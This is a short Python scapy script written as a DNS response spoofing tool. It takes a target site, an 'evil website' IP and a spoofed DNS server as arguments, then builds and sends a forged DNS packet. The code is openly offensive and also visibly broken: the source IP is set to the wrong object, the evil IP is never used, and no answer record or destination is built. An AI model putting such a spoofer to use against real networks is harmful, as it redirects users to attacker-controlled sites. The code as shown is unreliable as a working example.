from scapy.all import *
import argparse

parser = argparse.ArgumentParser()
parser.add_argument("targetsite",  help="the webiste that your are faking the DNS repsonse")
parser.add_argument("evilIP", help="IP of evil website")
parser.add_argument("dnsserver", help="spoofed DNS server")
args = parser.parse_args()

dns_pkt=DNS(qr=1,rd=1,qd=DNSQR(qname=args.targetsite))
udp_pkt=UDP()
ip_pkt=IP(src=ls)

pkt = ip_pkt/udp_pkt/dns_pkt

send(pkt)
